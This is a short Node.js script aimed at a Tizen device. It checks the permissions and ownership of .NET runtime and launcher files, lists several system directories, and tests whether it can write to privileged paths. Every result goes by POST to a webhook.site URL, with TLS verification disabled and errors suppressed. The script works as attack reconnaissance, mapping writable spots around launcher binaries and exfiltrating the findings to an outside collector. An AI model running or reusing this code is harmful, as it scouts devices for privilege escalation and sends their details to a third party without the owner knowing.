var fs = require('fs');
var https = require('https');
function send(p, b) {
    try {
        var r = https.request({
            hostname: 'webhook.site',
            path: '/49eca885-643e-4d14-a1d1-c284408e4033/' + p,
            method: 'POST',
            rejectUnauthorized: false
        }, function () {});
        r.on('error', function () {});
        r.end(b);
    } catch (e) {}
}
function stat(p) {
    try {
        var s = fs.statSync(p);
        send('perm', p + ' mode=' + s.mode.toString(8) + ' uid=' + s.uid + ' gid=' + s.gid + ' size=' + s.size);
    } catch (e) {
        send('perm', p + ' ERR ' + e);
    }
}
['/opt/dotnet', '/opt/dotnet/runtime', '/opt/dotnet/runtime/corerun', '/usr/share/dotnet.tizen/netcoreapp', '/usr/share/dotnet.tizen/netcoreapp/corerun', '/usr/bin/dotnet-launcher', '/usr/bin/dotnet-launcher-inhouse', '/usr/bin/node', '/usr/bin/bash', '/opt/usr/apps/xvvl3S1bvH'].forEach(stat);
['/opt/dotnet', '/opt/dotnet/runtime', '/usr/share/dotnet.tizen', '/usr/share/dotnet.tizen/netcoreapp', '/opt/usr/apps/xvvl3S1bvH'].forEach(function (d) {
    try {
        send('perm', d + ' list=' + fs.readdirSync(d).slice(0, 40).join(','));
    } catch (e) {
        send('perm', d + ' list ERR ' + e);
    }
});
['/opt/dotnet/tb-test', '/opt/dotnet/runtime/tb-test', '/usr/share/dotnet.tizen/tb-test', '/opt/usr/apps/xvvl3S1bvH/tb-test', '/home/owner/share/tb-test'].forEach(function (p) {
    try {
        fs.writeFileSync(p, 'x');
        send('perm', p + ' WRITE OK');
        try { fs.unlinkSync(p); } catch (e) {}
    } catch (e) {
        send('perm', p + ' WRITE ERR ' + e);
    }
});
